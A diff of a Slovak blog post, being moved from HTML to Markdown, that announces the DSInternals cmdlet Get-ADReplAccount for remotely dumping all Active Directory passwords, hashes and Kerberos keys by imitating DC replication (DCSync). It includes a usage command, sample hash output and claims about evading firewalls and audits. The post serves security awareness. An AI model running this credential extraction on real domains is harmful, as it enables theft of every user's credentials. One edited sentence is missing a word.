@@ -5,40 +5,35 @@ date: 2015-08-03T20:35:52+00:00
 layout: post
 lang: sk
 permalink: /sk/vykradanie-hesiel-z-active-directory-na-dialku/
+tags:
+    - 'Active Directory'
+    - PowerShell
+    - Prednášky
+    - Security
 ---
-<p style="text-align: justify;">
-  Predstavujem Vám príkaz <b>Get-ADReplAccount</b>, najnovší prírastok do&nbsp;môjho <a href="https://www.dsinternals.com/sk/na-stiahnutie/">PowerShell modulu DSInternals</a>, ktorý umožňuje z doménových kontrolérov na&nbsp;diaľku získať plaintextové heslá, hashe hesiel a Kerberos kľúče všetkých používateľov. Toho dosahuje tým, že&nbsp;simuluje chovanie príkazu <strong>dcromo</strong> a&nbsp;cez&nbsp;protokol <a href="https://msdn.microsoft.com/en-us/library/cc228086.aspx">MS-DRSR</a> si&nbsp;vytvorí repliku všetkých dát v&nbsp;Active Directory databáze. Podľa mojich informácií sa&nbsp;jedná o&nbsp;jediný verejne dostupný nástroj svojho druhu na&nbsp;svete. Ďalej má tieto vlastnosti:
-</p>
 
-<li style="text-align: justify;">
-  Ku svojej činnosti nevyžaduje ani práva doménového správcu. Bohate si&nbsp;vystačí s&nbsp;oprávnením <strong>Replicating Directory Changes All</strong>, ktoré má napríklad DirSync, Cisco WAAS či&nbsp;zle nakonfigurovaný SharePoint.
-</li>
-<li style="text-align: justify;">
-  Otvára dvere dokorán ďalším útokom, ako sú pass-the-hash, pass-the-ticket či&nbsp;PAC spoofing, pomocou ktorých je&nbsp;útočník schopný dostať pod&nbsp;kontrolu celý Active Directory forest. Takéto útoky zvláda napríklad nástroj <a href="http://blog.gentilkiwi.com/mimikatz">mimikatz</a>.
-</li>
-<li style="text-align: justify;">
-  Nedá sa&nbsp;zablokovať pomocou firewallu, pretože by&nbsp;to&nbsp;obmedzilo základnú funkčnosť Active Directory.
-</li>
-<li style="text-align: justify;">
-  V&nbsp;logoch na&nbsp;doménovom radiči zanecháva len&nbsp;minimálnu stopu, ktorú prehliadne väčšina bezpečnostných auditov.
-</li>
-<li style="text-align: justify;">
-  Nezneužíva žiadnu bezpečnostnú zraniteľnosť, ktorá by&nbsp;sa&nbsp;dala jednoducho opraviť v&nbsp;rámci aktualizácie systému.
-</li>
-<li style="text-align: justify;">
-  Jeho použitie nevyžaduje žiadne špeciálne vedomosti či&nbsp;prípravu. Útočníkovi stačí základná znalosť Active Directory.
-</li>
+Predstavujem Vám príkaz **Get-ADReplAccount**, najnovší prírastok do môjho [PowerShell modulu DSInternals](https://www.dsinternals.com/sk/na-stiahnutie/), ktorý umožňuje z doménových kontrolérov na diaľku získať plaintextové heslá, hashe hesiel a Kerberos kľúče všetkých používateľov. Toho dosahuje tým, že simuluje chovanie príkazu **dcromo** a cez protokol [MS-DRSR](https://msdn.microsoft.com/en-us/library/cc228086.aspx) si vytvorí repliku všetkých dát v Active Directory databáze. Podľa mojich informácií sa jedná o jediný verejne dostupný nástroj svojho druhu na svete. Ďalej má tieto vlastnosti:
+
+- Ku svojej činnosti nevyžaduje ani práva doménového správcu. Bohate si&nbsp;vystačí s&nbsp;oprávnením **Replicating Directory Changes All**, ktoré má napríklad DirSync, Cisco WAAS či&nbsp;zle nakonfigurovaný SharePoint.
+- Otvára dvere dokorán ďalším útokom, ako sú pass-the-hash, pass-the-ticket či&nbsp;PAC spoofing, pomocou ktorých je&nbsp;útočník schopný dostať pod&nbsp;kontrolu celý Active Directory forest. Takéto útoky zvláda napríklad nástroj [mimikatz](https://blog.gentilkiwi.com/mimikatz).
+- Nedá sa&nbsp;zablokovať pomocou firewallu, pretože by&nbsp;to&nbsp;základnú funkčnosť Active Directory.
+- V logoch na&nbsp;doménovom radiči zanecháva len&nbsp;minimálnu stopu, ktorú prehliadne väčšina bezpečnostných auditov.
+- Nezneužíva žiadnu bezpečnostnú zraniteľnosť, ktorá by&nbsp;sa&nbsp;dala jednoducho opraviť v&nbsp;rámci aktualizácie systému.
+- Jeho použitie nevyžaduje žiadne špeciálne vedomosti či&nbsp;prípravu. Útočníkovi stačí základná znalosť Active Directory.
 
 Príklad použitia:
 
-<pre class="lang:ps decode:true">Import-Module DSInternals
+```powershell
+Import-Module DSInternals
 $cred = Get-Credential
 Get-ADReplAccount -SamAccountName April -Domain Adatum -Server LON-DC1 `
--Credential $cred -Protocol TCP</pre>
+-Credential $cred -Protocol TCP
+```
 
 Ukážkový výstup:
 
-<pre class="nums:false lang:default highlight:0 decode:true">DistinguishedName: CN=April Reagan,OU=IT,DC=Adatum,DC=com
+```
+DistinguishedName: CN=April Reagan,OU=IT,DC=Adatum,DC=com
 Sid: S-1-5-21-3180365339-800773672-3767752645-1375
 Guid: 124ae098-699b-4450-a47a-314a29cc90ea
 SamAccountName: April
@@ -138,12 +133,7 @@ SupplementalCredentials:
     Hash 26: e1e20982753c6a1140c1a8241b23b9ea
     Hash 27: e5ec1c63e0e549e49cda218bc3752051
     Hash 28: 26f2d85f7513d73dd93ab3afd2d90cf6
-    Hash 29: 84010d657e6b58ce233fae2bd7644222</pre>
+    Hash 29: 84010d657e6b58ce233fae2bd7644222
+```
 
-<p style="text-align: justify;">
-  Potenciál tohoto útoku je&nbsp;teda veľký a&nbsp;mal by&nbsp;si&nbsp;toho byť minimálne vedomý každý manažér bezpečnosti a&nbsp;správca Active Directory.
-</p>
-
-<p style="text-align: justify;">
-  Ak chcete tento aj&nbsp;ďalšie druhy hackerských útokov na&nbsp;AD vidieť naživo a&nbsp;dozvedieť sa, ako sa&nbsp;proti nim brániť, nenechajte si&nbsp;ujsť moju prednášku <a href="https://www.hackerfest.cz/prednasky/#offlineaonlineutokynaactivedirectorydatabazi">Offline a&nbsp;online útoky na&nbsp;Active Directory databázu</a> na&nbsp;tohtoročnom <a href="https://www.hackerfest.cz/">HackerFeste</a>. Ja sám sa&nbsp;teším na&nbsp;prednášky <a href="https://www.hackerfest.cz/prednasky/#nepratelenajednomsmetisti">Ondřeja Ševečka</a> a&nbsp;<a href="https://www.hackerfest.cz/speaker-lineup/william-ischanoe-2/">Williama Ischanoeho</a>. A&nbsp;pokiaľ si&nbsp;ma &#8220;odchytíte&#8221; medzi prednáškami, rád sa&nbsp;s&nbsp;Vami porozprávam pri kávičke, nielen o&nbsp;bezpečnosti Active Directory.
-</p>
+Potenciál tohoto&nbsp;útoku (inak nazývaného DCSync) je&nbsp;teda veľký a&nbsp;mal by&nbsp;si&nbsp;toho byť minimálne vedomý každý manažér bezpečnosti a&nbsp;správca Active Directory.
